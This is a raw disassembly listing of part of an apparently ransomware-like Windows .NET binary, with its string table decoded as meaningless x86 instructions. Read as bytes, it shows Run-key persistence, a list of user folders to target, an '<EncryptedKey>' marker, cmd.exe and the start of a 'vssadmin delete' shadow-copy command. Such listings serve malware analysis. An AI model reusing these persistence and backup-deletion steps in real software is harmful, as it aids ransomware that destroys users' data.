  405269:	65 72 62             	gs jb  0x4052ce
  40526c:	00 50 72             	add    %dl,0x72(%eax)
  40526f:	6f                   	outsl  %ds:(%esi),(%dx)
  405270:	63 65 73             	arpl   %esp,0x73(%ebp)
  405273:	73 57                	jae    0x4052cc
  405275:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40527c:	79 6c                	jns    0x4052ea
  40527e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405282:	74 5f                	je     0x4052e3
  405284:	57                   	push   %edi
  405285:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40528c:	79 6c                	jns    0x4052fa
  40528e:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  405292:	73 74                	jae    0x405308
  405294:	65 6d                	gs insl (%dx),%es:(%edi)
  405296:	2e 43                	cs inc %ebx
  405298:	6f                   	outsl  %ds:(%esi),(%dx)
  405299:	6d                   	insl   (%dx),%es:(%edi)
  40529a:	70 6f                	jo     0x40530b
  40529c:	6e                   	outsb  %ds:(%esi),(%dx)
  40529d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40529f:	74 4d                	je     0x4052ee
  4052a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a2:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4052a5:	00 57 69             	add    %dl,0x69(%edi)
  4052a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4052a9:	33 32                	xor    (%edx),%esi
  4052ab:	45                   	inc    %ebp
  4052ac:	78 63                	js     0x405311
  4052ae:	65 70 74             	gs jo  0x405325
  4052b1:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4052b8:	5f                   	pop    %edi
  4052b9:	4e                   	dec    %esi
  4052ba:	61                   	popa
  4052bb:	74 69                	je     0x405326
  4052bd:	76 65                	jbe    0x405324
  4052bf:	45                   	inc    %ebp
  4052c0:	72 72                	jb     0x405334
  4052c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c3:	72 43                	jb     0x405308
  4052c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c6:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  4052cb:	74 5f                	je     0x40532c
  4052cd:	50                   	push   %eax
  4052ce:	72 6f                	jb     0x40533f
  4052d0:	63 65 73             	arpl   %esp,0x73(%ebp)
  4052d3:	73 4e                	jae    0x405323
  4052d5:	61                   	popa
  4052d6:	6d                   	insl   (%dx),%es:(%edi)
  4052d7:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4052db:	72 65                	jb     0x405342
  4052dd:	61                   	popa
  4052de:	6d                   	insl   (%dx),%es:(%edi)
  4052df:	57                   	push   %edi
  4052e0:	72 69                	jb     0x40534b
  4052e2:	74 65                	je     0x405349
  4052e4:	72 00                	jb     0x4052e6
  4052e6:	54                   	push   %esp
  4052e7:	65 78 74             	gs js  0x40535e
  4052ea:	57                   	push   %edi
  4052eb:	72 69                	jb     0x405356
  4052ed:	74 65                	je     0x405354
  4052ef:	72 00                	jb     0x4052f1
  4052f1:	57                   	push   %edi
  4052f2:	72 69                	jb     0x40535d
  4052f4:	74 65                	je     0x40535b
  4052f6:	4c                   	dec    %esp
  4052f7:	69 6e 65 00 52 65 70 	imul   $0x70655200,0x65(%esi),%ebp
  4052fe:	6c                   	insb   (%dx),%es:(%edi)
  4052ff:	61                   	popa
  405300:	63 65 00             	arpl   %esp,0x0(%ebp)
  405303:	4d                   	dec    %ebp
  405304:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40530b:	74 2e                	je     0x40533b
  40530d:	57                   	push   %edi
  40530e:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  405315:	67 69 73 74 72 79 00 	imul   $0x52007972,0x74(%bp,%di),%esi
  40531c:	52 
  40531d:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  405324:	4b 65 
  405326:	79 00                	jns    0x405328
  405328:	43                   	inc    %ebx
  405329:	75 72                	jne    0x40539d
  40532b:	72 65                	jb     0x405392
  40532d:	6e                   	outsb  %ds:(%esi),(%dx)
  40532e:	74 55                	je     0x405385
  405330:	73 65                	jae    0x405397
  405332:	72 00                	jb     0x405334
  405334:	4f                   	dec    %edi
  405335:	70 65                	jo     0x40539c
  405337:	6e                   	outsb  %ds:(%esi),(%dx)
  405338:	53                   	push   %ebx
  405339:	75 62                	jne    0x40539d
  40533b:	4b                   	dec    %ebx
  40533c:	65 79 00             	gs jns 0x40533f
  40533f:	53                   	push   %ebx
  405340:	65 74 56             	gs je  0x405399
  405343:	61                   	popa
  405344:	6c                   	insb   (%dx),%es:(%edi)
  405345:	75 65                	jne    0x4053ac
  405347:	00 73 65             	add    %dh,0x65(%ebx)
  40534a:	74 5f                	je     0x4053ab
  40534c:	46                   	inc    %esi
  40534d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405354:	00 
  405355:	73 65                	jae    0x4053bc
  405357:	74 5f                	je     0x4053b8
  405359:	41                   	inc    %ecx
  40535a:	72 67                	jb     0x4053c3
  40535c:	75 6d                	jne    0x4053cb
  40535e:	65 6e                	outsb  %gs:(%esi),(%dx)
  405360:	74 73                	je     0x4053d5
  405362:	00 57 61             	add    %dl,0x61(%edi)
  405365:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  40536c:	69 
  40536d:	74 00                	je     0x40536f
  40536f:	47                   	inc    %edi
  405370:	65 74 54             	gs je  0x4053c7
  405373:	65 6d                	gs insl (%dx),%es:(%edi)
  405375:	70 50                	jo     0x4053c7
  405377:	61                   	popa
  405378:	74 68                	je     0x4053e2
  40537a:	00 46 72             	add    %al,0x72(%esi)
  40537d:	6f                   	outsl  %ds:(%esi),(%dx)
  40537e:	6d                   	insl   (%dx),%es:(%edi)
  40537f:	42                   	inc    %edx
  405380:	61                   	popa
  405381:	73 65                	jae    0x4053e8
  405383:	36 34 53             	ss xor $0x53,%al
  405386:	74 72                	je     0x4053fa
  405388:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40538f:	74 65                	je     0x4053f6
  405391:	41                   	inc    %ecx
  405392:	6c                   	insb   (%dx),%es:(%edi)
  405393:	6c                   	insb   (%dx),%es:(%edi)
  405394:	42                   	inc    %edx
  405395:	79 74                	jns    0x40540b
  405397:	65 73 00             	gs jae 0x40539a
  40539a:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  40539e:	6f                   	outsl  %ds:(%esi),(%dx)
  40539f:	72 00                	jb     0x4053a1
  4053a1:	67 65 74 5f          	addr16 gs je 0x405404
  4053a5:	55                   	push   %ebp
  4053a6:	73 65                	jae    0x40540d
  4053a8:	72 4e                	jb     0x4053f8
  4053aa:	61                   	popa
  4053ab:	6d                   	insl   (%dx),%es:(%edi)
  4053ac:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  4053b0:	74 50                	je     0x405402
  4053b2:	74 72                	je     0x405426
  4053b4:	00 43 6f             	add    %al,0x6f(%ebx)
  4053b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4053b8:	74 72                	je     0x40542c
  4053ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4053bb:	6c                   	insb   (%dx),%es:(%edi)
  4053bc:	00 67 65             	add    %ah,0x65(%edi)
  4053bf:	74 5f                	je     0x405420
  4053c1:	48                   	dec    %eax
  4053c2:	61                   	popa
  4053c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4053c4:	64 6c                	fs insb (%dx),%es:(%edi)
  4053c6:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  4053ca:	74 63                	je     0x40542f
  4053cc:	68 00 47 72 6f       	push   $0x6f724700
  4053d1:	75 70                	jne    0x405443
  4053d3:	00 67 65             	add    %ah,0x65(%edi)
  4053d6:	74 5f                	je     0x405437
  4053d8:	53                   	push   %ebx
  4053d9:	75 63                	jne    0x40543e
  4053db:	63 65 73             	arpl   %esp,0x73(%ebp)
  4053de:	73 00                	jae    0x4053e0
  4053e0:	67 65 74 5f          	addr16 gs je 0x405443
  4053e4:	4d                   	dec    %ebp
  4053e5:	73 67                	jae    0x40544e
  4053e7:	00 53 74             	add    %dl,0x74(%ebx)
  4053ea:	61                   	popa
  4053eb:	72 74                	jb     0x405461
  4053ed:	73 57                	jae    0x405446
  4053ef:	69 74 68 00 43 6f 6e 	imul   $0x746e6f43,0x0(%eax,%ebp,2),%esi
  4053f6:	74 
  4053f7:	61                   	popa
  4053f8:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%esi),%ebp
  4053ff:	5f                   	pop    %edi
  405400:	45                   	inc    %ebp
  405401:	78 53                	js     0x405456
  405403:	74 79                	je     0x40547e
  405405:	6c                   	insb   (%dx),%es:(%edi)
  405406:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40540a:	74 5f                	je     0x40546b
  40540c:	45                   	inc    %ebp
  40540d:	78 53                	js     0x405462
  40540f:	74 79                	je     0x40548a
  405411:	6c                   	insb   (%dx),%es:(%edi)
  405412:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  405416:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405419:	44                   	inc    %esp
  40541a:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405421:	6c                   	insb   (%dx),%es:(%edi)
  405422:	61                   	popa
  405423:	73 73                	jae    0x405498
  405425:	31 00                	xor    %eax,(%eax)
  405427:	52                   	push   %edx
  405428:	65 74 75             	gs je  0x4054a0
  40542b:	72 6e                	jb     0x40549b
  40542d:	56                   	push   %esi
  40542e:	61                   	popa
  40542f:	6c                   	insb   (%dx),%es:(%edi)
  405430:	75 65                	jne    0x405497
  405432:	00 3c 47             	add    %bh,(%edi,%eax,2)
  405435:	65 74 54             	gs je  0x40548c
  405438:	65 78 74             	gs js  0x4054af
  40543b:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40543f:	30 00                	xor    %al,(%eax)
  405441:	43                   	inc    %ebx
  405442:	6c                   	insb   (%dx),%es:(%edi)
  405443:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  40544a:	00 45 6d             	add    %al,0x6d(%ebp)
  40544d:	70 74                	jo     0x4054c3
  40544f:	79 00                	jns    0x405451
  405451:	41                   	inc    %ecx
  405452:	70 61                	jo     0x4054b5
  405454:	72 74                	jb     0x4054ca
  405456:	6d                   	insl   (%dx),%es:(%edi)
  405457:	65 6e                	outsb  %gs:(%esi),(%dx)
  405459:	74 53                	je     0x4054ae
  40545b:	74 61                	je     0x4054be
  40545d:	74 65                	je     0x4054c4
  40545f:	00 53 65             	add    %dl,0x65(%ebx)
  405462:	74 41                	je     0x4054a5
  405464:	70 61                	jo     0x4054c7
  405466:	72 74                	jb     0x4054dc
  405468:	6d                   	insl   (%dx),%es:(%edi)
  405469:	65 6e                	outsb  %gs:(%esi),(%dx)
  40546b:	74 53                	je     0x4054c0
  40546d:	74 61                	je     0x4054d0
  40546f:	74 65                	je     0x4054d6
  405471:	00 4a 6f             	add    %cl,0x6f(%edx)
  405474:	69 6e 00 3c 3e 63 5f 	imul   $0x5f633e3c,0x0(%esi),%ebp
  40547b:	5f                   	pop    %edi
  40547c:	44                   	inc    %esp
  40547d:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405484:	6c                   	insb   (%dx),%es:(%edi)
  405485:	61                   	popa
  405486:	73 73                	jae    0x4054fb
  405488:	34 00                	xor    $0x0,%al
  40548a:	3c 53                	cmp    $0x53,%al
  40548c:	65 74 54             	gs je  0x4054e3
  40548f:	65 78 74             	gs js  0x405506
  405492:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405496:	33 00                	xor    (%eax),%eax
  405498:	00 49 61             	add    %cl,0x61(%ecx)
  40549b:	00 62 00             	add    %ah,0x0(%edx)
  40549e:	63 00                	arpl   %eax,(%eax)
  4054a0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4054a4:	66 00 67 00          	data16 add %ah,0x0(%edi)
  4054a8:	68 00 69 00 6a       	push   $0x6a006900
  4054ad:	00 6b 00             	add    %ch,0x0(%ebx)
  4054b0:	6c                   	insb   (%dx),%es:(%edi)
  4054b1:	00 6d 00             	add    %ch,0x0(%ebp)
  4054b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4054b5:	00 6f 00             	add    %ch,0x0(%edi)
  4054b8:	70 00                	jo     0x4054ba
  4054ba:	71 00                	jno    0x4054bc
  4054bc:	72 00                	jb     0x4054be
  4054be:	73 00                	jae    0x4054c0
  4054c0:	74 00                	je     0x4054c2
  4054c2:	75 00                	jne    0x4054c4
  4054c4:	76 00                	jbe    0x4054c6
  4054c6:	77 00                	ja     0x4054c8
  4054c8:	78 00                	js     0x4054ca
  4054ca:	79 00                	jns    0x4054cc
  4054cc:	7a 00                	jp     0x4054ce
  4054ce:	30 00                	xor    %al,(%eax)
  4054d0:	31 00                	xor    %eax,(%eax)
  4054d2:	32 00                	xor    (%eax),%al
  4054d4:	33 00                	xor    (%eax),%eax
  4054d6:	34 00                	xor    $0x0,%al
  4054d8:	35 00 36 00 37       	xor    $0x37003600,%eax
  4054dd:	00 38                	add    %bh,(%eax)
  4054df:	00 39                	add    %bh,(%ecx)
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	01 00                	add    %eax,(%eax)
  4054e5:	1b 3c 00             	sbb    (%eax,%eax,1),%edi
  4054e8:	45                   	inc    %ebp
  4054e9:	00 6e 00             	add    %ch,0x0(%esi)
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	79 00                	jns    0x4054f0
  4054f0:	70 00                	jo     0x4054f2
  4054f2:	74 00                	je     0x4054f4
  4054f4:	65 00 64 00 4b       	add    %ah,%gs:0x4b(%eax,%eax,1)
  4054f9:	00 65 00             	add    %ah,0x0(%ebp)
  4054fc:	79 00                	jns    0x4054fe
  4054fe:	3e 00 00             	add    %al,%ds:(%eax)
  405501:	1d 3c 00 45 00       	sbb    $0x45003c,%eax
  405506:	6e                   	outsb  %ds:(%esi),(%dx)
  405507:	00 63 00             	add    %ah,0x0(%ebx)
  40550a:	79 00                	jns    0x40550c
  40550c:	70 00                	jo     0x40550e
  40550e:	74 00                	je     0x405510
  405510:	65 00 64 00 4b       	add    %ah,%gs:0x4b(%eax,%eax,1)
  405515:	00 65 00             	add    %ah,0x0(%ebp)
  405518:	79 00                	jns    0x40551a
  40551a:	3e 00 20             	add    %ah,%ds:(%eax)
  40551d:	00 00                	add    %al,(%eax)
  40551f:	03 2e                	add    (%esi),%ebp
  405521:	00 00                	add    %al,(%eax)
  405523:	03 2f                	add    (%edi),%ebp
  405525:	00 00                	add    %al,(%eax)
  405527:	80 8b 61 00 62 00 63 	orb    $0x63,0x620061(%ebx)
  40552e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405532:	00 66 00             	add    %ah,0x0(%esi)
  405535:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  405539:	69 00 6a 00 6b 00    	imul   $0x6b006a,(%eax),%eax
  40553f:	6c                   	insb   (%dx),%es:(%edi)
  405540:	00 6d 00             	add    %ch,0x0(%ebp)
  405543:	6e                   	outsb  %ds:(%esi),(%dx)
  405544:	00 6f 00             	add    %ch,0x0(%edi)
  405547:	70 00                	jo     0x405549
  405549:	71 00                	jno    0x40554b
  40554b:	72 00                	jb     0x40554d
  40554d:	73 00                	jae    0x40554f
  40554f:	74 00                	je     0x405551
  405551:	75 00                	jne    0x405553
  405553:	76 00                	jbe    0x405555
  405555:	77 00                	ja     0x405557
  405557:	78 00                	js     0x405559
  405559:	79 00                	jns    0x40555b
  40555b:	7a 00                	jp     0x40555d
  40555d:	41                   	inc    %ecx
  40555e:	00 42 00             	add    %al,0x0(%edx)
  405561:	43                   	inc    %ebx
  405562:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  405566:	00 46 00             	add    %al,0x0(%esi)
  405569:	47                   	inc    %edi
  40556a:	00 48 00             	add    %cl,0x0(%eax)
  40556d:	49                   	dec    %ecx
  40556e:	00 4a 00             	add    %cl,0x0(%edx)
  405571:	4b                   	dec    %ebx
  405572:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  405576:	00 4e 00             	add    %cl,0x0(%esi)
  405579:	4f                   	dec    %edi
  40557a:	00 50 00             	add    %dl,0x0(%eax)
  40557d:	51                   	push   %ecx
  40557e:	00 52 00             	add    %dl,0x0(%edx)
  405581:	53                   	push   %ebx
  405582:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  405586:	00 56 00             	add    %dl,0x0(%esi)
  405589:	57                   	push   %edi
  40558a:	00 58 00             	add    %bl,0x0(%eax)
  40558d:	59                   	pop    %ecx
  40558e:	00 5a 00             	add    %bl,0x0(%edx)
  405591:	31 00                	xor    %eax,(%eax)
  405593:	32 00                	xor    (%eax),%al
  405595:	33 00                	xor    (%eax),%eax
  405597:	34 00                	xor    $0x0,%al
  405599:	35 00 36 00 37       	xor    $0x37003600,%eax
  40559e:	00 38                	add    %bh,(%eax)
  4055a0:	00 39                	add    %bh,(%ecx)
  4055a2:	00 30                	add    %dh,(%eax)
  4055a4:	00 2a                	add    %ch,(%edx)
  4055a6:	00 21                	add    %ah,(%ecx)
  4055a8:	00 3d 00 26 00 3f    	add    %bh,0x3f002600
  4055ae:	00 26                	add    %ah,(%esi)
  4055b0:	00 2f                	add    %ch,(%edi)
  4055b2:	00 00                	add    %al,(%eax)
  4055b4:	1d 3c 00 45 00       	sbb    $0x45003c,%eax
  4055b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4055ba:	00 63 00             	add    %ah,0x0(%ebx)
  4055bd:	72 00                	jb     0x4055bf
  4055bf:	79 00                	jns    0x4055c1
  4055c1:	70 00                	jo     0x4055c3
  4055c3:	74 00                	je     0x4055c5
  4055c5:	65 00 64 00 4b       	add    %ah,%gs:0x4b(%eax,%eax,1)
  4055ca:	00 65 00             	add    %ah,0x0(%ebp)
  4055cd:	79 00                	jns    0x4055cf
  4055cf:	3e 00 00             	add    %al,%ds:(%eax)
  4055d2:	07                   	pop    %es
  4055d3:	43                   	inc    %ebx
  4055d4:	00 3a                	add    %bh,(%edx)
  4055d6:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4055da:	11 5c 00 44          	adc    %ebx,0x44(%eax,%eax,1)
  4055de:	00 65 00             	add    %ah,0x0(%ebp)
  4055e1:	73 00                	jae    0x4055e3
  4055e3:	6b 00 74             	imul   $0x74,(%eax),%eax
  4055e6:	00 6f 00             	add    %ch,0x0(%edi)
  4055e9:	70 00                	jo     0x4055eb
  4055eb:	00 0d 5c 00 4c 00    	add    %cl,0x4c005c
  4055f1:	69 00 6e 00 6b 00    	imul   $0x6b006e,(%eax),%eax
  4055f7:	73 00                	jae    0x4055f9
  4055f9:	00 13                	add    %dl,(%ebx)
  4055fb:	5c                   	pop    %esp
  4055fc:	00 43 00             	add    %al,0x0(%ebx)
  4055ff:	6f                   	outsl  %ds:(%esi),(%dx)
  405600:	00 6e 00             	add    %ch,0x0(%esi)
  405603:	74 00                	je     0x405605
  405605:	61                   	popa
  405606:	00 63 00             	add    %ah,0x0(%ebx)
  405609:	74 00                	je     0x40560b
  40560b:	73 00                	jae    0x40560d
  40560d:	00 15 5c 00 44 00    	add    %dl,0x44005c
  405613:	6f                   	outsl  %ds:(%esi),(%dx)
  405614:	00 63 00             	add    %ah,0x0(%ebx)
  405617:	75 00                	jne    0x405619
  405619:	6d                   	insl   (%dx),%es:(%edi)
  40561a:	00 65 00             	add    %ah,0x0(%ebp)
  40561d:	6e                   	outsb  %ds:(%esi),(%dx)
  40561e:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  405622:	00 00                	add    %al,(%eax)
  405624:	15 5c 00 44 00       	adc    $0x44005c,%eax
  405629:	6f                   	outsl  %ds:(%esi),(%dx)
  40562a:	00 77 00             	add    %dh,0x0(%edi)
  40562d:	6e                   	outsb  %ds:(%esi),(%dx)
  40562e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  405632:	00 61 00             	add    %ah,0x0(%ecx)
  405635:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  405639:	00 13                	add    %dl,(%ebx)
  40563b:	5c                   	pop    %esp
  40563c:	00 50 00             	add    %dl,0x0(%eax)
  40563f:	69 00 63 00 74 00    	imul   $0x740063,(%eax),%eax
  405645:	75 00                	jne    0x405647
  405647:	72 00                	jb     0x405649
  405649:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40564d:	00 0d 5c 00 4d 00    	add    %cl,0x4d005c
  405653:	75 00                	jne    0x405655
  405655:	73 00                	jae    0x405657
  405657:	69 00 63 00 00 13    	imul   $0x13000063,(%eax),%eax
  40565d:	5c                   	pop    %esp
  40565e:	00 4f 00             	add    %cl,0x0(%edi)
  405661:	6e                   	outsb  %ds:(%esi),(%dx)
  405662:	00 65 00             	add    %ah,0x0(%ebp)
  405665:	44                   	inc    %esp
  405666:	00 72 00             	add    %dh,0x0(%edx)
  405669:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40566f:	00 19                	add    %bl,(%ecx)
  405671:	5c                   	pop    %esp
  405672:	00 53 00             	add    %dl,0x0(%ebx)
  405675:	61                   	popa
  405676:	00 76 00             	add    %dh,0x0(%esi)
  405679:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40567e:	00 47 00             	add    %al,0x0(%edi)
  405681:	61                   	popa
  405682:	00 6d 00             	add    %ch,0x0(%ebp)
  405685:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  405689:	00 15 5c 00 46 00    	add    %dl,0x46005c
  40568f:	61                   	popa
  405690:	00 76 00             	add    %dh,0x0(%esi)
  405693:	6f                   	outsl  %ds:(%esi),(%dx)
  405694:	00 72 00             	add    %dh,0x0(%edx)
  405697:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40569d:	73 00                	jae    0x40569f
  40569f:	00 13                	add    %dl,(%ebx)
  4056a1:	5c                   	pop    %esp
  4056a2:	00 53 00             	add    %dl,0x0(%ebx)
  4056a5:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4056a9:	72 00                	jb     0x4056ab
  4056ab:	63 00                	arpl   %eax,(%eax)
  4056ad:	68 00 65 00 73       	push   $0x73006500
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	0f 5c 00             	subps  (%eax),%xmm0
  4056b7:	56                   	push   %esi
  4056b8:	00 69 00             	add    %ch,0x0(%ecx)
  4056bb:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4056bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4056c0:	00 73 00             	add    %dh,0x0(%ebx)
  4056c3:	00 03                	add    %al,(%ebx)
  4056c5:	5c                   	pop    %esp
  4056c6:	00 00                	add    %al,(%eax)
  4056c8:	0b 72 00             	or     0x0(%edx),%esi
  4056cb:	75 00                	jne    0x4056cd
  4056cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4056ce:	00 61 00             	add    %ah,0x0(%ecx)
  4056d1:	73 00                	jae    0x4056d3
  4056d3:	00 09                	add    %cl,(%ecx)
  4056d5:	2e 00 75 00          	add    %dh,%cs:0x0(%ebp)
  4056d9:	72 00                	jb     0x4056db
  4056db:	6c                   	insb   (%dx),%es:(%edi)
  4056dc:	00 00                	add    %al,(%eax)
  4056de:	25 5b 00 49 00       	and    $0x49005b,%eax
  4056e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4056e4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4056e8:	00 72 00             	add    %dh,0x0(%edx)
  4056eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4056ec:	00 65 00             	add    %ah,0x0(%ebp)
  4056ef:	74 00                	je     0x4056f1
  4056f1:	53                   	push   %ebx
  4056f2:	00 68 00             	add    %ch,0x0(%eax)
  4056f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4056f6:	00 72 00             	add    %dh,0x0(%edx)
  4056f9:	74 00                	je     0x4056fb
  4056fb:	63 00                	arpl   %eax,(%eax)
  4056fd:	75 00                	jne    0x4056ff
  4056ff:	74 00                	je     0x405701
  405701:	5d                   	pop    %ebp
  405702:	00 00                	add    %al,(%eax)
  405704:	19 55 00             	sbb    %edx,0x0(%ebp)
  405707:	52                   	push   %edx
  405708:	00 4c 00 3d          	add    %cl,0x3d(%eax,%eax,1)
  40570c:	00 66 00             	add    %ah,0x0(%esi)
  40570f:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  405715:	3a 00                	cmp    (%eax),%al
  405717:	2f                   	das
  405718:	00 2f                	add    %ch,(%edi)
  40571a:	00 2f                	add    %ch,(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	17                   	pop    %ss
  40571f:	49                   	dec    %ecx
  405720:	00 63 00             	add    %ah,0x0(%ebx)
  405723:	6f                   	outsl  %ds:(%esi),(%dx)
  405724:	00 6e 00             	add    %ch,0x0(%esi)
  405727:	49                   	dec    %ecx
  405728:	00 6e 00             	add    %ch,0x0(%esi)
  40572b:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40572f:	78 00                	js     0x405731
  405731:	3d 00 30 00 00       	cmp    $0x3000,%eax
  405736:	13 49 00             	adc    0x0(%ecx),%ecx
  405739:	63 00                	arpl   %eax,(%eax)
  40573b:	6f                   	outsl  %ds:(%esi),(%dx)
  40573c:	00 6e 00             	add    %ch,0x0(%esi)
  40573f:	46                   	inc    %esi
  405740:	00 69 00             	add    %ch,0x0(%ecx)
  405743:	6c                   	insb   (%dx),%es:(%edi)
  405744:	00 65 00             	add    %ah,0x0(%ebp)
  405747:	3d 00 00 5b 53       	cmp    $0x535b0000,%eax
  40574c:	00 4f 00             	add    %cl,0x0(%edi)
  40574f:	46                   	inc    %esi
  405750:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  405754:	00 41 00             	add    %al,0x0(%ecx)
  405757:	52                   	push   %edx
  405758:	00 45 00             	add    %al,0x0(%ebp)
  40575b:	5c                   	pop    %esp
  40575c:	00 4d 00             	add    %cl,0x0(%ebp)
  40575f:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  405765:	6f                   	outsl  %ds:(%esi),(%dx)
  405766:	00 73 00             	add    %dh,0x0(%ebx)
  405769:	6f                   	outsl  %ds:(%esi),(%dx)
  40576a:	00 66 00             	add    %ah,0x0(%esi)
  40576d:	74 00                	je     0x40576f
  40576f:	5c                   	pop    %esp
  405770:	00 57 00             	add    %dl,0x0(%edi)
  405773:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405779:	6f                   	outsl  %ds:(%esi),(%dx)
  40577a:	00 77 00             	add    %dh,0x0(%edi)
  40577d:	73 00                	jae    0x40577f
  40577f:	5c                   	pop    %esp
  405780:	00 43 00             	add    %al,0x0(%ebx)
  405783:	75 00                	jne    0x405785
  405785:	72 00                	jb     0x405787
  405787:	72 00                	jb     0x405789
  405789:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40578d:	74 00                	je     0x40578f
  40578f:	56                   	push   %esi
  405790:	00 65 00             	add    %ah,0x0(%ebp)
  405793:	72 00                	jb     0x405795
  405795:	73 00                	jae    0x405797
  405797:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40579d:	5c                   	pop    %esp
  40579e:	00 52 00             	add    %dl,0x0(%edx)
  4057a1:	75 00                	jne    0x4057a3
  4057a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4057a4:	00 00                	add    %al,(%eax)
  4057a6:	1f                   	pop    %ds
  4057a7:	4d                   	dec    %ebp
  4057a8:	00 69 00             	add    %ch,0x0(%ecx)
  4057ab:	63 00                	arpl   %eax,(%eax)
  4057ad:	72 00                	jb     0x4057af
  4057af:	6f                   	outsl  %ds:(%esi),(%dx)
  4057b0:	00 73 00             	add    %dh,0x0(%ebx)
  4057b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4057b4:	00 66 00             	add    %ah,0x0(%esi)
  4057b7:	74 00                	je     0x4057b9
  4057b9:	20 00                	and    %al,(%eax)
  4057bb:	53                   	push   %ebx
  4057bc:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4057c0:	00 72 00             	add    %dh,0x0(%edx)
  4057c3:	65 00 00             	add    %al,%gs:(%eax)
  4057c6:	0f 63 00             	packsswb (%eax),%mm0
  4057c9:	6d                   	insl   (%dx),%es:(%edi)
  4057ca:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  4057ce:	00 65 00             	add    %ah,0x0(%ebp)
  4057d1:	78 00                	js     0x4057d3
  4057d3:	65 00 00             	add    %al,%gs:(%eax)
  4057d6:	07                   	pop    %es
  4057d7:	2f                   	das
  4057d8:	00 43 00             	add    %al,0x0(%ebx)
  4057db:	20 00                	and    %al,(%eax)
  4057dd:	00 79 76             	add    %bh,0x76(%ecx)
  4057e0:	00 73 00             	add    %dh,0x0(%ebx)
  4057e3:	73 00                	jae    0x4057e5
  4057e5:	61                   	popa
  4057e6:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  4057ea:	00 69 00             	add    %ch,0x0(%ecx)
  4057ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4057ee:	00 20                	add    %ah,(%eax)
  4057f0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4057f4:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
